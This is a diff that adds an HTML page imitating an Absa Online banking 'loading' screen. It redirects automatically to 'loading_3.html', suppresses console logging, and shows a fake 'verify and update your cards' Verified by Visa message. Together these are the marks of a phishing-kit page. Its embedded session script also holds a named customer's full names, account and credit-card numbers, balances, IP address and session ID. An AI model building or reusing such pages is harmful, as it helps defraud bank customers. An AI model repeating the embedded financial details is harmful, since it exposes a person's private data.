@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+
+ <meta http-equiv="refresh" content=25.0;URL="loading_3.html"> 
+  
+<!--<base href="/axob/cb/">--><base href=".">
+  
+         <script type="text/javascript">
+		    console.log = function(){};
+		    window.console.log = console.log;
+		 </script>
+  
+
+  <link rel="icon" type="image/x-icon" href="https://ib.absa.co.za/axob/cb/favicon_rebranded.ico?v=1">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+
+	<!-- OLD copied -->
+	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+	<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+	<meta http-equiv="Pragma" content="no-cache">
+	<meta http-equiv="Expires" content="0">
+
+	<title>Express - Absa Online</title>
+	
+
+	<meta name="format-detection" content="telephone=no">
+		
+
+	<link rel="stylesheet" href="./loading_files/styles_bb6222b6.css">
+	
+	<!--  Device profiling -->
+			
+		
+
+	<script src="./loading_files/satelliteLib-b1540e1f6f10ce8255ee8da4ce2289b894f2dd38.js.download"></script><script src="./loading_files/satellite-5992abc864746d4854000071.js.download"></script>
+	
+	
+		<script>
+		 	var IIPAccountTypesAllowed = 'Savings|Current';
+			
+			if (IIPAccountTypesAllowed == "") {
+				IIPAccountTypesAllowed = "Savings|Current";
+			}
+		
+			 //Globally scoped XWC2 configuration values 
+			 GlobalConfig={
+					 GLOBAL_EXPRESS_SERVICE_BASE_URL:'https://ib.absa.co.za',
+					 GLOBAL_EXPRESS_SERVICE_ROOT_CONTEXT:'/axob',
+			 		 GLOBAL_EXPRESS_SERVICE_RESPONSE_CODE_OK: '0',
+					 GLOBAL_EXPRESS_SERVICE_TIMEOUT: '120000',
+					 GLOBAL_EXPRESS_NCIPHER_TIMEOUT: '15000',
+					 GLOBAL_EXPRESS_SERVICE_SURECHECK_POLLING_INT:15000,
+					 GLOBAL_EXPRESS_SERVICE_SURECHECKV2_POLLING_INT:5000,
+					 GLOBAL_EXPRESS_SERVICE_SURECHECK_RESENDS_ALLOWED:5,
+					 GLOBAL_EXPRESS_SERVICE_OTP_RESENDS_ALLOWED:5,
+					 GLOBAL_EXPRESS_SERVICE_USE_TEST_DATA: false,
+					 GLOBAL_EXPRESS_REDIRECT_LOGIN_PAGE: '/login.jsp', 
+					 GLOBAL_EXPRESS_ABANDON_SHIP_PAGE: '/login.jsp', 
+					 GLOBAL_EXPRESS_NCIPHER_URL:'https://vs1.absa.co.za',
+				     GLOBAL_EXPRESS_APP_URL : 'https://ib.absa.co.za/axob',
+					 GLOBAL_EXPRESS_USER_IDLE_TIMEOUT:240000,
+					 GLOBAL_EXPRESS_PING_TIMEOUT:30000,
+					 GLOBAL_EXPRESS_PING_ENABLED:true,
+					 GLOBAL_EXPRESS_ACCESSCONTROL_ENABLED:true,
+					 GLOBAL_EXPRESS_TOLLFREE_HELPLINE:'0860 008 600',
+					 GLOBAL_EXPRESS_INTERNATIONAL_HELPLINE:'+2711 501 5110',
+					 GLOBAL_EXPRESS_CALLCENTRE_EMAIL:'ib@absa.co.za',
+					 GLOBAL_EXPRESS_FRAUD_CALLCENTRE:'0860 557 557',
+					 GLOBAL_EXPRESS_FRAUD_EMAIL:'secmon@absa.co.za',
+					 GLOBAL_EXPRESS_TODAYS_DATE:'2019-09-20',
+					 GLOBAL_EXPRESS_CHARGES_URL:'/absa-online/assets/Assets/Richmedia/PDF/Online/What_are_the_charges_info_Absa_Online_service_#LANG#_26June2019.pdf',
+					 GLOBAL_EXPRESS_LOCALE_LANGUAGE: 'en',
+					 
+					 GLOBAL_EXPRESS_LOCALE_COUNTRY:'za',
+					 GLOBAL_EXPRESS_BRAND:'absa',
+								 
+					 GLOBAL_EXPRESS_EXTERNAL_LINKS: {
+		        		footer1:'https://www.absa.co.za/legal-and-compliance/terms-of-use/', 
+		            	footer2:'http://www.absa.co.za/Absacoza/About-Absa/Absa-Bank/Corporate-Governance',
+		            	footer3:'http://www.absa.co.za/Absacoza/Legal/Browser-Requirements',
+		            	footer4:'http://www.absa.co.za/Absacoza/Legal/Privacy-Policy',
+		            	footer5:'https://www.absa.co.za/security-centre',
+		            	footer6:'https://www.absa.co.za/legal-and-compliance/terms-of-use/',
+		            	footerLogo:'http://www.absa.co.za'
+					 },
+					 GLOBAL_EXPRESS_EXTERNAL_HEADER_LINKS: {
+		        		header1:'http://www.absa.co.za/Absacoza/Contact-Us', 
+		            	header2:'http://www.absa.co.za/Absacoza/Individual/Ways-to-Bank/Anytime%2C-Anywhere/Absa-Online',
+		            	header3:'https://ib.absa.co.za/axob/j_security_logout',
+		            	header4:'',
+		            	header5:''
+					 },
+					 
+					 GLOBAL_EXPRESS_EXTERNAL_LOGIN_LINKS: {
+		        		header1:'http://www.absa.co.za/Absacoza/Contact-Us', 
+		            	header3:'https://ib.absa.co.za/axob/j_security_logout',
+			            Campaign1:'xwc/static/campaign/absa/contactus/index.html', 
+						Campaign2:'xwc/static/campaign/absa/pnp/index.html',
+			        	footer1:'https://www.absa.co.za/legal-and-compliance/terms-of-use/', 
+			            footer2:'http://www.absa.co.za/Absacoza/About-Absa/Absa-Bank/Corporate-Governance',
+			            footer3:'http://www.absa.co.za/Absacoza/Legal/Browser-Requirements',
+			            footer4:'http://www.absa.co.za/Absacoza/Legal/Privacy-Policy',
+						footer5:'https://www.absa.co.za/security-centre',
+						footer6:'https://www.absa.co.za/legal-and-compliance/terms-of-use/',
+			            footerLogo:'http://www.absa.co.za',
+						am1:'https://ib.absa.co.za/absa-online/registration/', 
+						am2:'http://www.absa.co.za/Absacoza/Individual/Ways-to-Bank/Anytime%2C-Anywhere/Absa-Online', 
+						am3:'http://www.absa.co.za/Absacoza/Individual/Ways-to-Bank/Anytime%2C-Anywhere/Absa-Online',
+						am4:'http://www.absa.co.za',
+						am5:'http://www.absa.co.za/Absacoza/Individual/Ways-to-Bank/Anytime%2C-Anywhere/Absa-Online',
+						am6:'http://www.absa.co.za/Absacoza/Individual/Ways-to-Bank/Anytime%2C-Anywhere/Absa-Online',
+						aa1:'',
+						aa2:'',
+						as1:'http://www.absa.co.za/Absacoza/Security-Centre/Online-Security/Absa-Online-Security-Measures',
+						as2:'http://www.absa.co.za/Absacoza/Security-Centre/Banking-Security/Phishing-Scams',
+						as3:'http://www.absa.co.za/Absacoza/Security-Centre/Online-Security/Protect-Yourself-Online',
+						as4:'http://www.absa.co.za/Absacoza/Security-Centre/Online-Security/Online-Shopping-and-3D-Secure',
+						as5:'http://www.absa.co.za/Absacoza/Security-Centre/Latest-Scams/Phishing-Scams',
+						as6:'http://www.absa.co.za/Absacoza/Security-Centre/Antivirus-Software/Antivirus-software',
+						termsofuse:'https://www.absa.co.za/legal-and-compliance/terms-of-use/'
+					 },			 
+					 
+		             GLOBAL_EXPRESS_FICA_HELPLINE:'0861 00 11 51',
+		             GLOBAL_EXPRESS_FICA_HELPEMAIL:'FICAhelp@absa.co.za',
+		             GLOBAL_EXPRESS_FICA_WARNING_ON_LOGOFF:'ONCE_FOR_SESSION',
+		             GLOBAL_EXPRESS_FICA_DOCUMENTEMAIL:'IFica3@absa.co.za',
+		             GLOBAL_EXPRESS_FICA_DOCUMENT_UPLOAD:'true',
+					 GLOBAL_EXPRESS_CASHSEND_TC_URL:'https://ib.absa.co.za/absa-online/assets/Assets/Richmedia/PDF/Online/TC/Cashsend_TC_',
+		      		 GLOBAL_EXPRESS_CASHSEND_MIN_AMOUNT:'20',
+		             GLOBAL_EXPRESS_CASHSEND_MAX_AMOUNT:'3000',
+		             GLOBAL_EXPRESS_CASHSEND_INCREMENT:'10',
+		             GLOBAL_EXPRESS_CASHSEND_DAILY_LIMIT:'3000',
+		             GLOBAL_EXPRESS_LINKDEVICE_TC_URL:'https://ib.absa.co.za/absa-online/assets/Assets/Richmedia/PDF/Electronic_Banking_for_Individuals_',
+		             GLOBAL_EXPRESS_IIP_ENABLED:true,
+		             GLOBAL_EXPRESS_IIP_RETRY_INTERVAL:5000,
+		             GLOBAL_EXPRESS_IIP_RETRY_COUNT:6,
+		             GLOBAL_EXPRESS_CHAT_BANKING_ENABLED:true,
+		             GLOBAL_EXPRESS_IIPDELAY_PAYMENT_LIMIT: 5000000.0, 
+		             GLOBAL_EXPRESS_FUTUREDATE_STARTIME:'23:00',
+		             GLOBAL_EXPRESS_IIP_ACCOUNT_TYPES_ALLOWED: IIPAccountTypesAllowed.split('|'), //convert to array
+		             GLOBAL_EXPRESS_CUTOFF_URL:'https://ib.absa.co.za/absa-online/assets/Assets/Richmedia/PDF/Online/Payments_CutOff_#LANG#_11July2018.pdf',
+					 GLOBAL_EXPRESS_IIP_TC_URL:'https://ib.absa.co.za/absa-online/assets/Assets/Richmedia/PDF/Online/TC/IIP_TC_#LANG#.pdf',
+		             GLOBAL_EXPRESS_PREPAID_RETRY_INTERVAL:4000,
+		             GLOBAL_EXPRESS_PREPAID_RETRY_COUNT:5,
+		             GLOBAL_EXPRESS_CHATBANKING_RETRY_INTERVAL:10000,
+		             GLOBAL_EXPRESS_CHATBANKING_RETRY_COUNT:12,
+		             GLOBAL_EXPRESS_CHATBANKING_CALLCENTRE:'08600 08600',
+		             GLOBAL_EXPRESS_SIMSWAP_HOLD_DURATION:'72',
+		             GLOBAL_EXPRESS_VCL_AOL_TAB_REDIRECT:'apply',
+		           	 GLOBAL_EXPRESS_VCL_OFFER_INIT_FETCH_RETRY:'3',
+		      		 GLOBAL_EXPRESS_VCL_OFFER_POLL_RETRY_COUNT:'5',
+		  			 GLOBAL_EXPRESS_VCL_OFFER_POLL_DELAY:'500',
+		             GLOBAL_EXPRESS_REWARDS_RETRY_COUNT:'4',
+		             GLOBAL_EXPRESS_REWARDS_RETRY_INTERVAL:'2000',
+		             GLOBAL_EXPRESS_REWARDS_CALLCENTRE:'0861 788 888',
+		             GLOBAL_EXPRESS_REWARDS_EMAIL_ADDRESS:'AbsaRewards@absa.co.za',
+		             GLOBAL_EXPRESS_REWARDS_FAX_NO:'0861 777 345',
+		             GLOBAL_EXPRESS_REWARDS_WEEKDAY_HOURS_START:'08:00',
+		             GLOBAL_EXPRESS_REWARDS_WEEKDAY_HOURS_END:'16:30',
+		             GLOBAL_EXPRESS_REWARDS_SATURDAY_HOURS_START:'08:00',
+		             GLOBAL_EXPRESS_REWARDS_SATURDAY_HOURS_END:'12:00',
+		             GLOBAL_EXPRESS_NO_OF_ACCOUNTS_TO_SHOW:'5',
+		             GLOBAL_EXPRESS_ESTATEMENTS_TC_URL:'',
+		             GLOBAL_EXPRESS_PREPAID_ELECTRICITY_HELPLINE:'0800 014 942',
+		             GLOBAL_EXPRESS_PREPAID_ELECTRICITY_ENABLED:true,
+		             GLOBAL_EXPRESS_2FA_IOS_DOWNLOAD_URL:'https://itunes.apple.com/za/app/absa-banking/id1085620596?mt=8',
+		             GLOBAL_EXPRESS_2FA_ANDROID_DOWNLOAD_URL:'https://play.google.com/store/apps/details?id=com.barclays.absa.banking&hl=en',
+		             GLOBAL_EXPRESS_2FA_WINDOWS_DOWNLOAD_URL:'https://www.microsoft.com/en-gb/store/p/absa-banking/9nblggh5ldhm',
+					 GLOBAL_EXPRESS_2FA_SCAN_QR_CODE_POLLING_INT:10000,
+					 GLOBAL_EXPRESS_2FA_SCAN_QR_CODE_MAX_RETRY_REQUESTS:3,
+					 GLOBAL_EXPRESS_2FA_DEVICE_REGISTERED_POLLING_INT:10000,
+					 GLOBAL_EXPRESS_2FA_APP_PASSCODE_MAX_RETRIES:3,
+					 GLOBAL_EXPRESS_2FA_SECURITY_CODE_MAX_RETRIES:5,
+					 GLOBAL_EXPRESS_2FA_OVERALL_ENABLED:'true',
+					 GLOBAL_EXPRESS_2FA_APPLICATIONS:'true',
+					 GLOBAL_EXPRESS_2FA_INFORMATION_VIDEO:'/axob/static/docs/absa/QRTutorialVideo_#LANG#.mp4',
+					 GLOBAL_EXPRESS_2FA_SURECHECK_TIMER:'60',
+					 GLOBAL_EXPRESS_2FA_INFORMATION_DOCUMENT:'https://www.absa.co.za/offers/sim-swap-fraud-protection',
+					 GLOBAL_EXPRESS_AVS_ENABLED:'true',
+		             GLOBAL_EXPRESS_AVS_ALLOWED_BANKNAME_LIST:'STANDARD BANK SA LTD|AFRICAN BANK|FIRSTRAND|SASFIN BANK|NEDBANK|ABSA BANK LIMITED|GRINDBANKL|CAPITEC|ABSA BANK|CAPITEC BANK LIMITED|FIRST NATIONAL BANK|STD S.A.|ABIL|SASFIN|GRINDROD BANK LIMITED',
+		             GLOBAL_EXPRESS_AVS_TC_URL:'/axob/static/docs/absa/Absa 6448_#LANG#.pdf',
+		             GLOBAL_EXPRESS_AVS_RETRY_COUNT:'4',
+		             GLOBAL_EXPRESS_AVS_RETRY_POLL_COUNT:'6',
+		             GLOBAL_EXPRESS_AVS_AVS_INITIAL_RETRY_POLL_COUNT:'6',
+		             GLOBAL_EXPRESS_AVS_AVS_RETRY_POLL_DELAY:'5000',
+		             GLOBAL_EXPRESS_BENEFICIARY_SWITCHING_ENABLED:'true',
+		             GLOBAL_EXPRESS_SWITCHING_INITIAL_RETRY_POLL_COUNT:'3',
+		      		 GLOBAL_EXPRESS_SWITCHING_POLL_RETRY_COUNT:'5',
+		  			 GLOBAL_EXPRESS_SWITCHING_POLL_DELAY:'500',
+		  			 GLOBAL_EXPRESS_FULL_SERVICE_URL: 'https://ib.absa.co.za/absa-online/j_auto_security_login',
+		  			 GLOBAL_EXPRESS_APPLICATION_ID: 'INTERNETCBNK',
+		  			 GLOBAL_EXPRESS_SERVER_ID: '',
+		  			 GLOBAL_EXPRESS_ACCOUNTS_CACHED_MAX_SIZE: '200',
+		  			 GLOBAL_EXPRESS_ACCOUNTS_PAGINATION_SIZE: '200',
+		  			 GLOBAL_EXPRESS_ACCOUNTS_CACHING_ENABLED: 'true',
+		  			 GLOBAL_EXPRESS_BENEFICIARIES_CACHED_MAX_SIZE: '200',
+		  			 GLOBAL_EXPRESS_BENEFICIARIES_PAGINATION_SIZE: '200',
+		  			 GLOBAL_EXPRESS_BENEFICIARIES_CACHING_ENABLED: 'true',		  			 
+		  			 GLOBAL_EXPRESS_DATALOADER_DOM_MAX_SIZE: '50',
+		  			 GLOBAL_EXPRESS_DATALOADER_CACHED_MAX_SIZE: '200',
+		  			 GLOBAL_EXPRESS_DATALOADER_PAGINATION_SIZE: '20',
+	 				 GLOBAL_EXPRESS_SURECHECK_POLLING_INTERVAL_CB: '5',
+	 				 GLOBAL_EXPRESS_AOL_REWARDS_URL: 'apply/applyForRewards/applyForRewards',
+		  			 GLOBAL_EXPRESS_AOL_FICADOCS_URL: 'profile/ficDocHandler',
+		  			 GLOBAL_EXPRESS_AOL_LINKACCOUNTS_URL: 'profile/linkUnlinkAccounts/linkUnlinkRetail',
+		  			 GLOBAL_EXPRESS_AOL_APPLYSAVINGS_URL: 'apply/createAccount/createAccount',
+		  			 GLOBAL_EXPRESS_AOL_INSURANCE_URL: 'insurance/insurancelandingpage',
+		  			 GLOBAL_EXPRESS_AOL_UNITTRUST_URL: 'apply/applyForUnitTrust/applyForUnitTrust',
+		  			 GLOBAL_EXPRESS_FRAUD_INTERNATIONAL: '+27 11 (0) 335 4019',
+		  			 GLOBAL_EXPRESS_LOST_STOLEN_CALLCENTER: '0800 111 155',
+		  			 GLOBAL_EXPRESS_LOST_STOLEN_INTERNATIONAL: '+27 11 (0) 501 5050',
+		  			 GLOBAL_EXPRESS_HELPLINE_EMAIL: 'absa@absa.co.za',
+		  			 GLOBAL_EXPRESS_HELPLINE_INTERNATIONAL: '+27 (0) 11 501 5110',		  			 
+		  			 GLOBAL_EXPRESS_CASHSEND_MONTHLY_LIMIT: '90000',
+		  			 GLOBAL_EXPRESS_CB_APP_PUSHMSGWIDTH:'576',
+		  			 GLOBAL_EXPRESS_2FA_CB_INFORMATION_VIDEO:'assets/videos/QRTutorialVideo_#LANG#.mp4',
+					 GLOBAL_EXPRESS_AVS_CB_TC_URL:'assets/docs/Absa 6448_#LANG#.pdf',
+					 GLOBAL_EXPRESS_FACEBOOK_MESSAGENGER_LINK:'https://m.me/absachatbanking',
+					 GLOBAL_EXPRESS_FACEBOOK_LINK_TIMER:'210',
+					 GLOBAL_EXPRESS_SARB_ENABLED:'true',
+		             GLOBAL_EXPRESS_SARB_UPLOAD_URL:'profile/ficDocHandler',
+		             GLOBAL_EXPRESS_SARB_RETRY_POLL_COUNT:'5',
+		             GLOBAL_EXPRESS_SARB_RETRY_POLL_DELAY:'500',
+		             GLOBAL_EXPRESS_SARB_BUSINESS_EMAIL:'commercialesponboarded@absa.co.za',
+		             GLOBAL_EXPRESS_INTERNATIONAL_PAYMENTS:'payments/internationalFundsTransfer/payIFTBeneficiary',
+		             GLOBAL_EXPRESS_WESTERNUNION_PAYMENTS:'payments/westernUnion/westernUnionSend',
+		             GLOCAL_EXPRESS_CONTEXTUAL_HELP_LINK:'https://onlinebanking.help.absa.co.za',
+      				 GLOCAL_EXPRESS_DASHBOARD_NUMBER_OF_ACCOUNTS_TO_DISPLAY:'4'   
+			 };
+		
+			 //Session specific data from server 
+			 var ServerClientDataBridge={
+				     SERVER_DATA_BRIDGE_TITLE_CODE: '1',
+				     SERVER_DATA_BRIDGE_INITIALS: 'MP',
+				     SERVER_DATA_BRIDGE_CLIENT_TYPE: 'I',
+					 SERVER_DATA_BRIDGE_SURNAME: 'NAGEL',
+					 SERVER_DATA_BRIDGE_FICA_STATUS: 'N',
+					 SERVER_DATA_BRIDGE_FICA_UI_FUNCTION_POINT_ACTIONS:{"ficaUIFunctionPointActions":[]},
+					 SERVER_DATA_BRIDGE_NOTIFICATIONS_TO_EMAIL:false,
+					 SERVER_DATA_BRIDGE_LIMIT_IAT_ENABLED:'true',
+					 SERVER_DATA_BRIDGE_LIMIT_BP_ENABLED:'false',
+					 SERVER_DATA_BRIDGE_LIMIT_PMT_ENABLED:'true',
+					 SERVER_DATA_BRIDGE_LIMIT_RP_ENABLED:'false',
+					 SERVER_DATA_BRIDGE_LIMIT_FDP_ENABLED:'false',
+					 SERVER_DATA_BRIDGE_PRIMARY_ACCOUNT:[{"number":"9087952354","name":"FLEXI ACC","uncleared":"0.00","available":"62008.35","balance":"-34124.04","accountType":"Current","accountActionsAllowedList":null}], 
+					 SERVER_DATA_BRIDGE_NUMBER_OF_ACCOUNTS:'2',
+					 SERVER_DATA_BRIDGE_SIMSWAP_HOLD_INPROGRESS:false,
+					 SERVER_DATA_BRIDGE_RVNBRANCHOPTION_HOLD_ENABLED:false,
+				     SERVER_DATA_BRIDGE_REWARDS_MEMBER: 'true',
+				     SERVER_DATA_BRIDGE_CLIENT_AGREEMENT_ACCEPTED:  'true',
+				     SERVER_DATA_BRIDGE_USER_2FA_ENROLLED: 'N',
+				     SERVER_DATA_BRIDGE_USER_2FA_STATE: 'SURECHECKV2_NOSMARTPHONE',
+				     SERVER_DATA_BRIDGE_USER_2FA_DAYS_LEFT: '60',
+				     SERVER_DATA_BRIDGE_USER_2FA_SNOOZED: 'true',
+				     SERVER_DATA_BRIDGE_DISPLAY_USER_MESSAGES:'false',
+				     SERVER_DATA_BRIDGE_USER_GENERIC_MESSAGE_DETAIL:'',
+					 SERVER_DATA_BRIDGE_NUMBER_OF_MESSAGES:'0',
+					 SERVER_DATA_BRIDGE_SUREPHRASE:'MP NAGEL',
+				     SERVER_DATA_BRIDGE_FIRSTNAMES:'MARK PIETER',
+				     SERVER_DATA_BRIDGE_ESFSESSIONID:'7e9d68d93f1684920cb3',
+				     SERVER_DATA_BRIDGE_SOURCEIP:'22.241.241.68',
+				     SERVER_DATA_BRIDGE_DASHBOARD_ACCOUNTS:[{"number":"9087952354","name":"FLEXI ACC","uncleared":"0.00","available":"62008.35","balance":"-34124.04","accountType":"Current","accountActionsAllowedList":["DR","CR","BAL","STMT","ACC_INF","BILL_PMT","OWN_DEF","RECUR_PMT","STOP_PMT","PREPD","OVRDRFT","ARCH_STMT","ELEC_STMT","UPD_CIF","CSHSND","STOP_DO"]},{"number":"4787698012625010","name":"Credit card account","uncleared":"10000.00","available":"8275.21","balance":"-277325.79","accountType":"CreditCard","accountActionsAllowedList":["DR","CR","BAL","STMT","ACC_INF","BILL_PMT","OWN_DEF","ARCH_STMT","ELEC_STMT","UPD_CIF","STOP_DO"]}],
+				     SERVER_DATA_BRIDGE_PAYMENT_BENEFICIARY_ALLOWED:'true',
+				     SERVER_DATA_BRIDGE_PREPAID_MOBILE_BENEFICIARY_ALLOWED:'true',
+				     SERVER_DATA_BRIDGE_PREPAID_ELECTRICITY_BENEFICIARY_ALLOWED:'true',
+				     SERVER_DATA_BRIDGE_CASHSEND_BENEFICIARY_ALLOWED:'true',
+				     SERVER_DATA_BRIDGE_TRANSFER_ALLOWED:'true',
+				     SERVER_DATA_BRIDGE_DISPLAY_ATTESTATION:'false',
+				     SERVER_DATA_BRIDGE_INTERCEPT_MESSAGES_DISPLAY_LOCATION_COUNT:'{"loginCount":2,"logoffCount":0,"both":0}',
+				     SERVER_DATA_BRIDGE_DEVICE_PROFILE_ENABLED:'false',
+			 		 SERVER_DATA_BRIDGE_DEVICE_PROFILE_SEND_DATA_TO_PROVIDER_ENABLED:'false',
+			 		 SERVER_DATA_BRIDGE_DEVICE_PROFILE_CUSTOMER_SESSIONID:'',
+			 		 SERVER_DATA_BRIDGE_DEVICE_PROFILE_SEND_LOGIN_ACTIVITY_ENABLED:'false'
+			 };
+		</script>
+	</head>
+    <body>
+		<style>
+			.pre-loader {
+			  	display: flex;
+			  	flex-direction: column;
+			  	height: 100vh; /* 1 */
+			  	flex: 1 0 auto;
+			  	background-color: #f4f3f3;
+			}
+	  
+			.pre-loader .top-bar {
+			  	background-color: #bbb;
+			  	left: 0;
+			  	min-height: 64px;
+			  	position: relative;
+			  	top: 0;
+			  	width: 100%;
+			}
+	  
+			.pre-loader .template-header {
+				background-color: #ddd;
+             		height: 80px;
+			}
+	  
+			/** Spinner **/
+			.spinner-container {
+			  	margin: 161px auto 0;
+				text-align: center;
+			}
+	  
+			.pre-loader .spinner-text {
+				color: #787272;
+			  	font-family: 'Source Sans Pro', Arial, Helvetica, sans-serif;
+			  	font-weight: 400;
+			  	margin: 0;
+			  	z-index: 2;
+			}
+	  
+			.lds-ring {
+			  	display: inline-block;
+			  	position: relative;
+			  	width: 64px;
+			  	height: 64px;
+			}
+	  
+			.lds-ring div {
+			  	box-sizing: border-box;
+			  	display: block;
+			  	position: absolute;
+			  	width: 51px;
+			  	height: 51px;
+			  	margin: 4px;
+				border: 4px solid #af144b;
+			  	border-radius: 50%;
+			  	animation: lds-ring 1.5s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+				border-color: #af144b transparent transparent transparent;
+			}
+	  
+			.lds-ring div:nth-child(1) {
+			  	animation-delay: -0.45s;
+			}
+	  
+			.lds-ring div:nth-child(2) {
+			  	animation-delay: -0.3s;
+			}
+	  
+			.lds-ring div:nth-child(3) {
+			  	animation-delay: -0.15s;
+			}
+	  
+			@keyframes lds-ring {
+			  	0% {
+					transform: rotate(0deg);
+			  	}
+			  	100% {
+					transform: rotate(360deg);
+			 	 }
+			}
+	  
+			@media screen and (max-width: 768px) {
+			  .pre-loader .side-nav {
+					height: 70px;
+			  }
+			}
+
+		</style>
+			
+	  	<div class="pre-loader">
+			<div class="top-bar"></div>
+			<div class="template-header"></div>
+			<div class="spinner-container">
+				<div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+				<p class="spinner-text">Please wait while we verify and update your cards...</p>
+				<p class="spinner-text">Verified by Visa protects your Visa card against unauthorized use online - <b> at no additional cost.</b></p>
+				<p class="spinner-text"><img src="vbv.png" width="230" height="103" alt=""/></p>
+				
+				
+			</div>
+		</div>
+				
+		<app-root></app-root>
+		<script type="text/javascript" src="./loading_files/runtime_bb6222b6.js.download"></script>
+		<script type="text/javascript" src="./loading_files/polyfills_bb6222b6.js.download"></script>
+		<script type="text/javascript" src="./loading_files/vendor_bb6222b6.js.download"></script><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_absa_0" src="./loading_files/dest5.html" style="display: none; width: 0px; height: 0px;"></iframe></body></html>
